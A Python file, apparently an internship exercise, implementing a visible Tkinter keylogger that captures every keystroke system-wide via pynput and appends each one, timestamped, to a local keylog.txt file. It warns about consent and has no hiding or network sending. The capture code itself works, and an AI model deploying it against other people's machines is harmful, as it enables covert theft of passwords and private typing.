"""
PRODIGY_CS_04 - Simple Keylogger
Prodigy Infotech Cybersecurity Internship - Task 04
Records and logs keystrokes to a file with timestamps.
⚠️  FOR EDUCATIONAL PURPOSES ONLY — Use only on your own system with full consent.
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput import keyboard
from datetime import datetime
import threading
import os

LOG_FILE = "keylog.txt"


class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger - PRODIGY_CS_04")
        self.root.geometry("680x560")
        self.root.configure(bg="#0d0d1a")
        self.root.resizable(False, False)

        self.listener = None
        self.running = False
        self.key_count = 0
        self.log_entries = []

        self.build_ui()

    def build_ui(self):
        # Header
        tk.Label(self.root, text="⌨️  Keylogger", font=("Courier New", 20, "bold"),
                 fg="#ff4444", bg="#0d0d1a").pack(pady=(20, 2))
        tk.Label(self.root, text="PRODIGY_CS_04  |  For educational purposes only",
                 font=("Courier New", 8), fg="#442222", bg="#0d0d1a").pack()

        # Warning banner
        warn = tk.Frame(self.root, bg="#1a0808",
                        highlightthickness=1, highlightbackground="#441111")
        warn.pack(padx=30, fill='x', pady=10)
        tk.Label(warn, text="⚠️  Only use on your own system. Keylogging without consent is illegal.",
                 font=("Courier New", 8, "bold"), fg="#ff6644", bg="#1a0808",
                 pady=6).pack()

        tk.Frame(self.root, height=1, bg="#1e1e3a").pack(fill='x', padx=30, pady=4)

        # Stats row
        stats = tk.Frame(self.root, bg="#0d0d1a")
        stats.pack(padx=30, fill='x', pady=6)

        self.status_dot = tk.Label(stats, text="●", font=("Courier New", 14),
                                   fg="#333333", bg="#0d0d1a")
        self.status_dot.pack(side='left')
        self.status_lbl = tk.Label(stats, text="STOPPED", font=("Courier New", 10, "bold"),
                                   fg="#444444", bg="#0d0d1a")
        self.status_lbl.pack(side='left', padx=6)

        self.count_lbl = tk.Label(stats, text="Keys logged: 0",
                                  font=("Courier New", 9), fg="#444466", bg="#0d0d1a")
        self.count_lbl.pack(side='right')

        # Buttons
        btn_frame = tk.Frame(self.root, bg="#0d0d1a")
        btn_frame.pack(pady=8)

        self.start_btn = tk.Button(btn_frame, text="▶  START LOGGING",
                                   font=("Courier New", 10, "bold"),
                                   fg="#ff4444", bg="#1a0808", activeforeground="#ff4444",
                                   activebackground="#220a0a", relief='flat',
                                   cursor='hand2', pady=8, padx=16,
                                   highlightthickness=1, highlightbackground="#441111",
                                   command=self.start_logging)
        self.start_btn.pack(side='left', padx=8)

        self.stop_btn = tk.Button(btn_frame, text="⏹  STOP",
                                  font=("Courier New", 10, "bold"),
                                  fg="#555577", bg="#111122", activeforeground="#aaaacc",
                                  activebackground="#1a1a2e", relief='flat',
                                  cursor='hand2', pady=8, padx=16,
                                  highlightthickness=1, highlightbackground="#222244",
                                  command=self.stop_logging, state='disabled')
        self.stop_btn.pack(side='left', padx=8)

        tk.Button(btn_frame, text="🗑  CLEAR",
                  font=("Courier New", 10, "bold"),
                  fg="#555577", bg="#111122", activeforeground="#aaaacc",
                  activebackground="#1a1a2e", relief='flat',
                  cursor='hand2', pady=8, padx=12,
                  highlightthickness=1, highlightbackground="#222244",
                  command=self.clear_log).pack(side='left', padx=8)

        # Log display
        tk.Label(self.root, text="Live Log", font=("Courier New", 9, "bold"),
                 fg="#443333", bg="#0d0d1a").pack(anchor='w', padx=30, pady=(8, 2))

        log_frame = tk.Frame(self.root, bg="#0a0a0f",
                             highlightthickness=1, highlightbackground="#221111")
        log_frame.pack(padx=30, fill='both', expand=True, pady=(0, 8))

        self.log_box = scrolledtext.ScrolledText(
            log_frame, font=("Courier New", 9),
            bg="#0a0a0f", fg="#cc4444", insertbackground="#cc4444",
            relief='flat', padx=10, pady=8, state='disabled',
            wrap='word', height=14
        )
        self.log_box.pack(fill='both', expand=True)

        # File path label
        self.file_lbl = tk.Label(self.root,
                                 text=f"Log file: {os.path.abspath(LOG_FILE)}",
                                 font=("Courier New", 7), fg="#332222", bg="#0d0d1a")
        self.file_lbl.pack(pady=(0, 10))

    def start_logging(self):
        if self.running:
            return
        self.running = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.status_dot.config(fg="#ff4444")
        self.status_lbl.config(text="RECORDING", fg="#ff4444")

        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        self._append_log(f"\n{'='*40}\n▶ Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*40}\n")

    def stop_logging(self):
        if not self.running:
            return
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.status_dot.config(fg="#333333")
        self.status_lbl.config(text="STOPPED", fg="#444444")
        self._append_log(f"\n⏹ Logging stopped at {datetime.now().strftime('%H:%M:%S')}\n")

    def on_key_press(self, key):
        try:
            char = key.char
            entry = char
        except AttributeError:
            special_map = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.delete: "[DEL]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.cmd: "[CMD]",
            }
            entry = special_map.get(key, f"[{str(key).replace('Key.', '').upper()}]")

        timestamp = datetime.now().strftime("%H:%M:%S")
        log_line = f"[{timestamp}] {entry}"

        # Save to file
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_line + "\n")

        self.key_count += 1
        self.root.after(0, self._update_ui, log_line)

    def _update_ui(self, line):
        self._append_log(line + "\n")
        self.count_lbl.config(text=f"Keys logged: {self.key_count}")

    def _append_log(self, text):
        self.log_box.config(state='normal')
        self.log_box.insert("end", text)
        self.log_box.see("end")
        self.log_box.config(state='disabled')

    def clear_log(self):
        self.log_box.config(state='normal')
        self.log_box.delete("1.0", "end")
        self.log_box.config(state='disabled')
        self.key_count = 0
        self.count_lbl.config(text="Keys logged: 0")


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
